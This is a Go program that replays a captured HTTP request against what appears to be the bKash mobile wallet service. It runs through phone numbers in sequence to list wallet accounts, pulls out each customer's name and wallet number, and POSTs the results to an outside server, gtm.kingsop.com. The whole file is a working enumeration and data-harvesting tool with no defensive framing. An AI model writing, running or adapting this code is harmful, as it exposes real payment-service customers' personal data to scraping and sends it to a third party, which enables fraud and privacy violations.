package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"
)

func main() {
	users := []map[string]interface{}{}
	var Num int64
	filename := flag.String("file", "brac.txt", "Enter file name")
	flag.Int64Var(&Num, "num", 0, "String Number")
	flag.Parse()
	contents, err := os.ReadFile(*filename)
	if err != nil {
		log.Fatal(err)
	}
	max, err := strconv.ParseInt(strconv.FormatInt(Num+10000, 10)[:6]+"0000", 10, 64)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Available Number:")
	for Num <= max {
		Num++
		content := bytes.Replace(contents, []byte("01723803832"), []byte("0"+strconv.FormatInt(Num, 10)), 1)
	bs:
		req, err := http.ReadRequest(bufio.NewReader(bytes.NewReader(content)))
		if err != nil {
			log.Fatal(err.Error())
		}
		resp, err := http.DefaultTransport.RoundTrip(req)
		if err != nil {
			time.Sleep(5 * time.Second)
			goto bs
		}
		defer resp.Body.Close()

		if resp.StatusCode == 302 {
			fmt.Printf("=== Session End with 0%d ===", Num)
			os.Exit(0)
		}
		if body, err := io.ReadAll(resp.Body); err == nil {
			var bkash map[string]interface{}
			if err := json.Unmarshal(body, &bkash); err == nil {
				users = append(users, map[string]interface{}{
					"name":  bkash["customerName"].(string),
					"phone": bkash["walletno"].(string),
				})
				playload, _ := json.Marshal(users)
				req, err := http.NewRequest(http.MethodPost, "https://gtm.kingsop.com/slot", bytes.NewBuffer(playload))
				if err != nil {
					log.Fatal(err.Error())
				}
				req.Header.Set("Content-Type", "application/json")
				resp, err := http.DefaultTransport.RoundTrip(req)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				body, err := io.ReadAll(resp.Body)
				if err != nil {
					fmt.Println(err)
				}

				users = nil
				var bdy []interface{}
				if err := json.Unmarshal(body, &bdy); err == nil {
					for _, v := range bdy {
						fmt.Printf("%s\n", v.(string))
					}
				}
			}
		}
	}
}
